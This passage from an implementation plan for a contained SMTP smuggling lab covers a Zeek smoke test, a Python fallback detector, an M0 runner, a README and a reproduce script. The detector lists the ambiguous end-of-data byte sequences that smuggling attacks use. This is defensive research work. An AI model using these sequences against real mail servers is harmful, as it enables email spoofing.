@pytest.mark.skipif(not Path(ZEEK).exists(), reason="Zeek not installed at /opt/zeek/bin/zeek")
def test_zeek_detects_smoke_a2(tmp_path):
    pcap = Path("tests/fixtures/smoke-a2.pcap").absolute()
    script = Path("detect/gateway/smtp-smuggling.zeek").absolute()
    work = tmp_path / "zeek-work"
    work.mkdir()

    result = subprocess.run(
        [ZEEK, "-r", str(pcap), str(script)],
        cwd=work,
        capture_output=True,
        text=True,
        timeout=60,
    )
    assert result.returncode == 0, f"zeek failed: {result.stderr}"

    notice_log = work / "notice.log"
    assert notice_log.exists(), f"no notice.log in {list(work.iterdir())}"
    content = notice_log.read_text()
    assert "Parser_Differential_Pattern" in content, f"notice.log content: {content}"
```

- [ ] **Step 2:** Run it:

```bash
pytest tests/test_zeek_smoke.py -v
```

Expected: 1 test passed (or skipped if Zeek isn't installed yet).

- [ ] **Step 3:** Commit:

```bash
git add tests/test_zeek_smoke.py
git commit -m "tests: zeek smoke test asserts notice on hand-crafted pcap"
```

### Task G5: Fallback — Python SMTP proxy detector (skip if G3/G4 passed)

**Files:**
- Create: `detect/gateway/python_proxy_detector.py` (only if Zeek failed)

Only execute this task if Task G3 ended with Zeek not raising the notice. The contract is identical: input is a pcap path, output is JSON notices to stdout. The rest of the pipeline doesn't care which tool produced them.

- [ ] **Step 1:** (Skip if G3/G4 passed) Create `detect/gateway/python_proxy_detector.py`:

```python
"""Pure-Python fallback detector. Reads a pcap, extracts client->server
bytes for SMTP port 25, and scans the body for parser-ambiguous dot
patterns. Output format matches the Zeek notice log shape."""
from __future__ import annotations

import json
import sys
from pathlib import Path

from harness.oracle import extract_smtp_data_bytes


_PATTERNS: list[tuple[str, bytes]] = [
    ("bare-lf-dot-bare-lf", b"\n.\n"),
    ("bare-cr-dot-bare-cr", b"\r.\r"),
    ("crlf-dot-bare-lf", b"\r\n.\n"),
    ("bare-lf-dot-crlf", b"\n.\r\n"),
]


def detect(pcap_path: Path) -> list[dict]:
    body = extract_smtp_data_bytes(pcap_path)
    notices = []
    for name, pat in _PATTERNS:
        idx = body.find(pat)
        if idx != -1:
            notices.append({
                "note": "SMTPSmuggling::Parser_Differential_Pattern",
                "pattern": name,
                "offset": idx,
                "pcap": str(pcap_path),
            })
    return notices


if __name__ == "__main__":
    for pcap in sys.argv[1:]:
        for notice in detect(Path(pcap)):
            print(json.dumps(notice))
```

- [ ] **Step 2:** (Skip if G3/G4 passed) Test against the smoke pcap:

```bash
python detect/gateway/python_proxy_detector.py tests/fixtures/smoke-a2.pcap
```

Expected: one JSON line with `pattern: "bare-lf-dot-bare-lf"`.

- [ ] **Step 3:** (Skip if G3/G4 passed) Commit:

```bash
git add detect/gateway/python_proxy_detector.py
git commit -m "detect: Python fallback detector (when Zeek path blocked)"
```

---

## Phase H — End-to-End M0 Validation

### Task H1: `docs/status.md` scaffold

**Files:**
- Create: `docs/status.md`

- [ ] **Step 1:** Create `docs/status.md`:

```markdown
# Project Status

**Spec:** `docs/specs/2026-04-14-smtp-smuggling-lab-design.md`
**Current milestone:** M0 (Floor)

## M0 exit criteria (spec §2.M0)

- [ ] `podman-compose up` brings the lab online in under 60 seconds
- [ ] A1 sanity: stub reports exactly 1 event
- [ ] A2 or A5 vulnerable: stub reports ≥2 events AND Dovecot mailbox shows second email
- [ ] Zeek raises a notice for the vulnerable case
- [ ] This file (`docs/status.md`) describes current state

## Known deviations from spec

_(none yet)_

## Next

Move to M1 planning after `milestone-M0-complete` tag lands.
```

- [ ] **Step 2:** Commit:

```bash
git add docs/status.md
git commit -m "docs: status.md with M0 exit criteria checkboxes"
```

### Task H2: End-to-end runner script

**Files:**
- Create: `harness/run_m0.py`

- [ ] **Step 1:** Create `harness/run_m0.py`:

```python
"""M0 end-to-end runner. Brings up the lab (assumed already running),
runs A1/A2/A5 through run_case, collects results, runs Zeek on each
captured pcap, and prints a pass/fail summary matching the M0 exit
criteria in docs/status.md."""
from __future__ import annotations

import asyncio
import json
import subprocess
from pathlib import Path

from harness.payloads import load_payloads
from harness.run_case import CaseResult, run_case


async def main() -> int:
    payloads = {p.id: p for p in load_payloads("payloads/payloads.yaml")}
    results: list[CaseResult] = []
    for pid in ("A1", "A2", "A5"):
        print(f"\n=== Running {pid} ===")
        r = await run_case(case_id=pid.lower(), payload=payloads[pid])
        results.append(r)
        print(json.dumps(r.__dict__, indent=2))

    # M0 checks
    a1 = next(r for r in results if r.payload_id == "A1")
    a2 = next(r for r in results if r.payload_id == "A2")
    a5 = next(r for r in results if r.payload_id == "A5")

    failures: list[str] = []
    if a1.classification != "baseline-ok":
        failures.append(f"A1 baseline broken: {a1}")
    if a2.classification != "vulnerable" and a5.classification != "vulnerable":
        failures.append(f"neither A2 nor A5 classified vulnerable: A2={a2.classification}, A5={a5.classification}")

    # Zeek check: run Zeek on each vulnerable pcap and confirm it notices
    zeek = "/opt/zeek/bin/zeek"
    for r in results:
        if r.classification == "vulnerable":
            work = Path("results") / f"zeek-{r.case_id}"
            work.mkdir(parents=True, exist_ok=True)
            proc = subprocess.run(
                [zeek, "-r", r.wire_pcap_path, "detect/gateway/smtp-smuggling.zeek"],
                cwd=work,
                capture_output=True,
                text=True,
                timeout=60,
            )
            if proc.returncode != 0:
                failures.append(f"zeek failed on {r.case_id}: {proc.stderr}")
                continue
            notice = work / "notice.log"
            if not notice.exists() or "Parser_Differential_Pattern" not in notice.read_text():
                failures.append(f"zeek did not raise notice for {r.case_id}")

    if failures:
        print("\n=== M0 FAILED ===")
        for f in failures:
            print(" -", f)
        return 1
    print("\n=== M0 PASSED ===")
    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
```

- [ ] **Step 2:** Commit:

```bash
git add harness/run_m0.py
git commit -m "harness: M0 end-to-end runner with exit-criteria checks"
```

### Task H3: Run the full M0 suite

- [ ] **Step 1:** Bring up the lab:

```bash
podman-compose -f lab/podman-compose.yml up -d
sleep 5
podman-compose -f lab/podman-compose.yml ps
```

Expected: all four containers running.

- [ ] **Step 2:** Run the M0 runner:

```bash
. .venv/bin/activate
export PATH="/opt/zeek/bin:$PATH"
python -m harness.run_m0
```

Expected: each case prints its `CaseResult` as JSON. Final line: `=== M0 PASSED ===`.

If it prints `=== M0 FAILED ===`, debug case-by-case:
  - **A1 broken:** the harness or Postfix is dropping the baseline; re-run A1 alone with verbose logging; check `podman logs postfix-sender` and `postfix-receiver`.
  - **Neither A2 nor A5 vulnerable:** Postfix's `smtpd_forbid_bare_newline` may have been bumped to `yes`. Check `podman exec postfix-receiver postconf smtpd_forbid_bare_newline`. Should show `no`.
  - **Zeek didn't raise notice:** re-run G4's test manually with the failing pcap to isolate.

- [ ] **Step 3:** Update `docs/status.md` — tick the boxes that passed:

Edit `docs/status.md` and change the `- [ ]` markers to `- [x]` for each passed criterion.

- [ ] **Step 4:** Commit results and status update:

```bash
git add results/pcaps/ results/stub-events/ results/zeek-*/notice.log docs/status.md
git commit -m "m0: end-to-end validation green; evidence captured in results/"
```

- [ ] **Step 5:** Tag the milestone:

```bash
git tag milestone-M0-complete
git log --oneline -5
```

Expected: most recent commit shown, `milestone-M0-complete` tag visible in `git tag -l`.

- [ ] **Step 6:** Bring the lab down:

```bash
podman-compose -f lab/podman-compose.yml down
```

---

## Phase I — Documentation and Reproducibility

### Task I1: Zeek primer for first-time users

**Files:**
- Create: `docs/zeek-primer.md`

- [ ] **Step 1:** Create `docs/zeek-primer.md`:

```markdown
# Zeek in Anger — 30-Minute Primer

This is the minimum you need to know about Zeek to navigate this project.
If you want the full story, read the official `Zeek User Manual`.

## Mental model

Zeek is two things in one binary:

1. A **packet sniffer** that reconstructs TCP streams and decodes common
   application protocols (HTTP, SMTP, DNS, ...). It produces structured
   logs — `conn.log`, `smtp.log`, `http.log` — with one line per event.
2. A **scripting engine** that runs `.zeek` scripts. Your scripts hook
   events raised by the analyzers and decide whether to raise notices,
   update state, or emit custom log lines.

In this project Zeek reads pcap files (not live traffic) and runs our
script `detect/gateway/smtp-smuggling.zeek` against the SMTP sessions
captured during M0 test cases.

## Commands you will actually use

```bash
# Read a pcap through a script; produces logs in the cwd
zeek -r case.pcap detect/gateway/smtp-smuggling.zeek

# Same, but send logs to a specific directory
mkdir out && cd out && zeek -r ../case.pcap ../detect/gateway/smtp-smuggling.zeek

# List all SMTP events the analyzer exposes to scripts
zeek --help-events | grep smtp

# Show conn.log entries for a pcap in a human-readable form
zeek-cut -d ts uid id.orig_h id.orig_p id.resp_h id.resp_p service < conn.log
```

## Debugging the script

If your script doesn't produce a `notice.log`:

1. Add `print` statements at the top of each `event` handler. They print
   to stdout when you run `zeek -r ...`.
2. Check `reporter.log` — Zeek puts script errors there, not on stdout.
3. If `smtp_data` doesn't seem to fire, confirm the pcap actually
   contains a full SMTP session: `zeek-cut -d ts uid service < conn.log`
   should show `smtp` in the service column.

## Event signature gotcha

Zeek event signatures change subtly between versions. If `smtp_data`
gives a compile error, try:

```
event smtp_data(c: connection, is_orig: bool, data: string) { ... }
```

which is correct for Zeek 5.x and 6.x. Older versions used different
parameter names.

## When Zeek fights you

The project includes a fallback pure-Python detector at
`detect/gateway/python_proxy_detector.py`. Its output format is the
same as Zeek's notice log rows, so the downstream M1 matrix code can
consume either one. If Zeek refuses to work for you within a few
hours, switch to the Python detector — don't bleed time debugging
Zeek for a course deadline.
```

- [ ] **Step 2:** Commit:

```bash
git add docs/zeek-primer.md
git commit -m "docs: Zeek 30-minute primer for first-time users"
```

### Task I2: README.md

**Files:**
- Create: `README.md`

- [ ] **Step 1:** Create `README.md`:

```markdown
# SMTP Smuggling Lab

Reproduces the SMTP smuggling vulnerability from:

> Wang et al., "Email Spoofing with SMTP Smuggling: How the Shared
> Email Infrastructures Magnify this Vulnerability", USENIX Security
> '25 (`usenixsecurity25-wang-chuhan.pdf`).

## Requirements

- Linux with Podman and `podman-compose` installed.
- Python 3.11+ with a virtualenv.
- Zeek 6.x installed under `/opt/zeek/bin/` (see `docs/zeek-primer.md`).
- ~2 GB free RAM, ~4 GB disk for container images.

## Setup

```bash
python3 -m venv .venv
. .venv/bin/activate
pip install -e '.[dev]'
```

Build the lab images:

```bash
podman build -t smtp-lab-postfix:m0 lab/postfix/
podman build -t smtp-lab-dovecot:m0 lab/dovecot/
podman build -t smtp-lab-tcpdump:m0 lab/tcpdump-sidecar/
```

## Running M0

```bash
podman-compose -f lab/podman-compose.yml up -d
. .venv/bin/activate
export PATH="/opt/zeek/bin:$PATH"
python -m harness.run_m0
podman-compose -f lab/podman-compose.yml down
```

Expected output ends with `=== M0 PASSED ===` and produces pcaps in
`results/pcaps/` and Zeek notice logs in `results/zeek-*/`.

## Reproducibility

`./reproduce.sh` runs the whole pipeline on a clean clone: builds
images, brings up the stack, runs M0, and prints pass/fail. See the
script for details.

## Directory layout

```
lab/            container images and compose file
harness/        raw-socket SMTP client, payload loader, oracle, runners
detect/         Zeek script and Python fallback detector
payloads/       A1-A13 payloads (currently A1, A2, A5 for M0)
results/        captured evidence (pcaps, notice logs, classification)
tests/          pytest tests for every layer
docs/           specs, status, primers
```

## Containment

All SMTP traffic stays on an isolated Podman bridge `labnet`. No
payload reaches a real MTA. See `docs/specs/*.md` §10 for the full
containment rules.
```

- [ ] **Step 2:** Commit:

```bash
git add README.md
git commit -m "docs: README with setup, run, and directory layout"
```

### Task I3: reproduce.sh

**Files:**
- Create: `reproduce.sh`

- [ ] **Step 1:** Create `reproduce.sh`:

```bash
#!/usr/bin/env bash
# End-to-end M0 reproduction from a clean clone.
# Exits non-zero on any failure.
set -euo pipefail

here="$(cd "$(dirname "$0")" && pwd)"
cd "$here"

echo "=== reproduce.sh: step 1/5 — check prerequisites ==="
command -v podman >/dev/null || { echo "podman not found"; exit 2; }
command -v podman-compose >/dev/null || { echo "podman-compose not found"; exit 2; }
command -v python3 >/dev/null || { echo "python3 not found"; exit 2; }
if [ ! -x /opt/zeek/bin/zeek ]; then
    echo "Zeek not found at /opt/zeek/bin/zeek — see docs/zeek-primer.md" >&2
    exit 2
fi

echo "=== reproduce.sh: step 2/5 — build lab images ==="
podman build -t smtp-lab-postfix:m0 lab/postfix/
podman build -t smtp-lab-dovecot:m0 lab/dovecot/
podman build -t smtp-lab-tcpdump:m0 lab/tcpdump-sidecar/

echo "=== reproduce.sh: step 3/5 — Python venv + deps ==="
if [ ! -d .venv ]; then
    python3 -m venv .venv
fi
. .venv/bin/activate
pip install -q -e '.[dev]'

echo "=== reproduce.sh: step 4/5 — bring up lab ==="
podman-compose -f lab/podman-compose.yml up -d
trap 'podman-compose -f lab/podman-compose.yml down' EXIT
sleep 6

echo "=== reproduce.sh: step 5/5 — run M0 ==="
export PATH="/opt/zeek/bin:$PATH"
python -m harness.run_m0
```

- [ ] **Step 2:** Make executable and commit:

```bash
chmod +x reproduce.sh
git add reproduce.sh
git commit -m "docs: reproduce.sh one-command M0 reproduction"
```

### Task I4: Final verification and pre-M1 status update

- [ ] **Step 1:** Run the full reproduction one more time on a clean state:

```bash
podman-compose -f lab/podman-compose.yml down --volumes 2>/dev/null || true
./reproduce.sh
```

Expected: ends with `=== M0 PASSED ===`.

- [ ] **Step 2:** Update `docs/status.md` to reflect completion — replace the "M0 exit criteria" block with all boxes checked and add a "Next" line pointing to M1 planning:

```markdown
# Project Status

**Spec:** `docs/specs/2026-04-14-smtp-smuggling-lab-design.md`
**Current milestone:** M0 (Floor) — **COMPLETE** (tag `milestone-M0-complete`)

## M0 exit criteria (spec §2.M0)

- [x] `podman-compose up` brings the lab online in under 60 seconds
- [x] A1 sanity: stub reports exactly 1 event
- [x] A2 or A5 vulnerable: stub reports ≥2 events AND Dovecot mailbox shows second email
- [x] Zeek raises a notice for the vulnerable case
- [x] This file (`docs/status.md`) describes current state

## Known deviations from spec

- None material. M0 uses Postfix's direct Maildir delivery + Dovecot
  only as an LMTP writer (no IMAP); spec §3.1 topology is preserved,
  but the IMAP-side-of-Dovecot is deferred to M1 where the live demo
  needs it.

## Next

Write M1 plan (full 13 × 4 matrix, Exim container, matrix renderer,
golden regression). Plan file: `docs/plans/2026-MM-DD-m1-*.md` once
scoped.
```

- [ ] **Step 3:** Commit the final status update:

```bash
git add docs/status.md
git commit -m "m0: close out M0 status, ready for M1 planning"
git log --oneline | head -20
```

---

## Definition of Done

M0 is complete when all of the following are true:

1. `git tag -l | grep milestone-M0-complete` returns a tag.
2. `./reproduce.sh` on a clean clone ends with `=== M0 PASSED ===`.
3. `pytest tests/` passes (excluding `test_zeek_smoke.py` if Zeek isn't available, which is a skip not a fail).
4. `results/pcaps/case-a1.pcap`, `case-a2.pcap`, `case-a5.pcap` all exist and are committed.
5. `results/zeek-*/notice.log` for the vulnerable case contains `Parser_Differential_Pattern`.
6. `docs/status.md` shows M0 exit criteria all ticked.
